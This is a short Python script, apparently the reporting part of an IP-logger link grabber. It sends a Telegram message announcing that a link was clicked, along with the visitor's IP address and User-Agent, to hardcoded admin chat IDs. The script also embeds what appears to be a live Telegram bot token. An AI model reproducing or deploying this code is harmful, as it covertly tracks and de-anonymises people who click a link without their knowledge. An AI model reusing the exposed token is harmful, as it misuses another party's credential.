import requests

TOKEN = "8378907712:AAFQfHHO7SnYb1xErSQmWSQ87Ln9Dz9sWFU"
ADMIN_IDS = ["45644013", "", "", ""]

def get_bot_info():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getMe"
        response = requests.get(url)
        return response.json()
    except Exception as e:
        print(f"Ошибка получения информации о боте: {e}")
        return None

def send_info(info):
    message = f"""
🔍 *Обнаружен переход по ссылке*

*Информация о сети:*
├ IP - адрес: `{info['ip']}`
├ User - Agent: `{info['user_agent']}`
"""
    
    try:
        bot_info = get_bot_info()
        if bot_info and bot_info.get('ok'):
            print(f"Бот: @{bot_info['result']['username']}")
        
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        
        success_count = 0
        for admin_id in ADMIN_IDS:
            data = {
                "chat_id": admin_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            response = requests.post(url, data=data)
            if response.status_code == 200:
                success_count += 1
                print(f"✅ Сообщение отправлено админу {admin_id}")
            else:
                error_data = response.json()
                print(f"❌ Ошибка отправки админу {admin_id}: {error_data.get('description', 'Unknown error')}")
        
        print(f"📊 Итог: {success_count}/{len(ADMIN_IDS)} сообщений доставлено")
        
    except Exception as e:
        print(f"💥 Критическая ошибка отправки: {e}")